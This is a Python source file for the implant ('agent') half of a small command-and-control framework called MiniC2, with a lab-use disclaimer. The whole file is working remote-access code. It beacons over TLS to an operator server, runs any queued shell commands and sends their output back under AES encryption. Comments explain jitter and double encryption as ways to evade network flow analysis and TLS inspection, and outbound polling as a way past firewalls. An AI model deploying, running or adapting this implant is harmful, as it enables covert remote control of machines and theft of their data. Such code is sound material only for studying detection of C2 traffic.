"""
agent.py — MiniC2 Implant

This is the "client-side" half of the C2 framework — the piece that runs
on the target machine and phones home to the server on a regular interval.

Beacon loop (repeats forever):
  1. POST /beacon — send an encrypted check-in with host metadata.
  2. The server responds with any commands queued by the operator.
  3. Execute each command in a subprocess and capture its output.
  4. POST /result — send the encrypted output back to the server.
  5. Sleep for BEACON_INTERVAL ± random JITTER seconds and repeat.

Key design decisions:
  - Polling model: the agent reaches out; the server never initiates a
    connection. This bypasses most inbound firewall rules on the target.
  - Jitter: random noise added to the sleep interval so the beacon doesn't
    appear as a perfectly regular spike in network flow analysis.
  - Double encryption: traffic is AES-256-GCM encrypted at the application
    layer, then wrapped in TLS — so payloads remain opaque even under
    TLS inspection or if a proxy strips the outer TLS.

⚠️  Built for educational lab use only. Run inside an isolated VM network.
    Never deploy against systems you don't own or have written permission to test.
"""

import platform
import random
import subprocess
import sys
import time
import uuid

import requests
import urllib3

from crypto import decrypt, encrypt

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Configuration ─────────────────────────────────────────────────────────────
# Set C2_HOST to the IP/hostname of the machine running server.py.
# The remaining values tune beacon behaviour and can be left at their defaults.
C2_HOST         = "https://192.168.x.x:4443"   # server IP:port
BEACON_INTERVAL = 10   # base seconds between check-ins
JITTER          = 3    # ± random seconds added each cycle (see sleep_with_jitter)
TASK_TIMEOUT    = 30   # hard limit per shell command; prevents hung processes
# ──────────────────────────────────────────────────────────────────────────────

# Each agent instance generates a random UUID on startup.
# This is what the server uses to track individual agents in the database.
# A production implant would derive a stable ID from hardware fingerprints
# (MAC address, CPU serial, etc.) so the same machine is always recognised
# even across reboots. A random UUID is simpler and sufficient for the lab.
AGENT_ID = str(uuid.uuid4())

# Reuse a single requests.Session so TCP connections are kept alive between
# beacons — avoids the overhead of a new TLS handshake every 10 seconds.
# session.verify=False is required for our self-signed cert; see gen_cert.sh.
session = requests.Session()
session.verify = False


# ── Core functions ────────────────────────────────────────────────────────────

def build_metadata() -> dict:
    """
    Build the check-in payload sent with every beacon.

    Kept intentionally minimal (agent ID, hostname, OS) so the lab stays
    readable. A real implant typically also fingerprints running AV products,
    local users/groups, network interfaces, and domain membership.
    """
    return {
        "agent_id": AGENT_ID,
        "hostname": platform.node(),
        "os":       platform.system() + " " + platform.release(),
    }


def do_beacon() -> list:
    """
    Check in with the server and return any queued tasks.

    Sends an encrypted POST to /beacon carrying this agent's metadata.
    The server responds with a list of pending commands (or an empty list
    if none are queued). All errors propagate up to the main loop, which
    logs them and retries after the next sleep interval.
    """
    payload  = build_metadata()
    response = session.post(
        f"{C2_HOST}/beacon",
        json={"data": encrypt(payload)},
        timeout=10,
    )
    response.raise_for_status()
    data = decrypt(response.json()["data"])
    return data.get("tasks", [])


def execute_command(command: str) -> str:
    """
    Run a shell command and return its combined stdout + stderr as a string.

    shell=True lets the command string use pipes, redirects, and shell
    builtins (e.g. 'ls | grep foo'). TASK_TIMEOUT is a hard ceiling that
    prevents a slow or stuck command from blocking the beacon loop indefinitely.
    """
    try:
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=TASK_TIMEOUT,
        )
        output = proc.stdout
        if proc.stderr:
            output += proc.stderr
        return output if output else "(command produced no output)"
    except subprocess.TimeoutExpired:
        return f"[!] Command timed out after {TASK_TIMEOUT}s."
    except Exception as exc:
        return f"[!] Execution error: {exc}"


def send_result(task_id: str, output: str) -> None:
    """
    Send command output back to the server via POST /result.

    The payload is AES-encrypted before transmission, just like the beacon.
    Pairing task_id with the output lets the server match the result to the
    correct task record in its SQLite database.
    """
    payload = {
        "agent_id": AGENT_ID,
        "task_id":  task_id,
        "output":   output,
    }
    session.post(
        f"{C2_HOST}/result",
        json={"data": encrypt(payload)},
        timeout=10,
    )


def sleep_with_jitter() -> None:
    """
    Sleep for BEACON_INTERVAL ± JITTER seconds.

    Why jitter matters for blue-team detection:
    A consistent 10-second beacon appears as a perfectly regular spike in
    network flow logs — trivial to flag with a simple time-delta rule.
    Adding random noise makes the timing look more like organic user traffic.
    """
    delay = BEACON_INTERVAL + random.uniform(-JITTER, JITTER)
    delay = max(delay, 1)       # never sleep less than 1 second
    time.sleep(delay)


# ── Main loop ─────────────────────────────────────────────────────────────────

def run():
    print(f"[*] MiniC2 agent started")
    print(f"    ID       : {AGENT_ID}")
    print(f"    C2 host  : {C2_HOST}")
    print(f"    Interval : {BEACON_INTERVAL}s ± {JITTER}s jitter")
    print()

    while True:
        try:
            tasks = do_beacon()

            if not tasks:
                print(f"[*] Beacon OK — no tasks")
            else:
                print(f"[+] Received {len(tasks)} task(s)")

            for task in tasks:
                task_id = task["id"]
                command = task["command"]
                print(f"    → Executing: {command!r}")
                output = execute_command(command)
                send_result(task_id, output)
                print(f"    ← Result sent ({len(output)} bytes)")

        except requests.exceptions.SSLError:
            print("[-] SSL error — cert mismatch? Retrying...")
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot reach {C2_HOST} — retrying...")
        except Exception as exc:
            print(f"[-] Unexpected error: {exc}")

        sleep_with_jitter()


if __name__ == "__main__":
    run()
